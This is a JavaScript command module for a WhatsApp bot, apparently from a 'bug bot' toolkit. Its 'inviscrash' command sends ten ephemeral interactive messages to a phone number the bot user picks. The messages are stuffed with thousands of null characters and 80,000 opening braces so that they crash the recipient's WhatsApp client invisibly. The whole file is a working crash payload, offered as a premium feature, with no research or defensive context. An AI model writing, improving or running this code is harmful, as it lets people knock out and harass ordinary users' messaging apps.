import { isPremiumUser } from '../../utils/premiumStore.js';
export default {
    name: 'inviscrash', aliases: ['invisgc', 'invisg', 'invisible'], category: 'bug',
    description: 'Invisible crash - relays without visible messages', usage: 'inviscrash <number>', cooldown: 30, ownerOnly: true,
    async execute({ sock, message, args, from, sender, isOwner }) {
        if (!isPremiumUser(sender) && !isOwner) return sock.sendMessage(from, { text: '❌ Premium required.' }, { quoted: message });
        const num = args[0]?.replace(/[^0-9]/g, ''); if (!num) return sock.sendMessage(from, { text: '❌ .inviscrash <number>' }, { quoted: message });
        const t = `${num}@s.whatsapp.net`;
        await sock.sendMessage(from, { react: { text: '👻', key: message.key } });
        for (let i = 0; i < 10; i++) {
            try { await sock.relayMessage(t, { ephemeralMessage: { message: { interactiveMessage: { header: { title: "\u0000".repeat(5000), hasMediaAttachment: false }, body: { text: "\u0000".repeat(5000) }, nativeFlowMessage: { messageParamsJson: "{".repeat(80000) } } } } }, {}); } catch {}
            await new Promise(r => setTimeout(r, 100));
        }
        await sock.sendMessage(from, { text: '✅ Invisible crash sent' }, { quoted: message });
    }
};
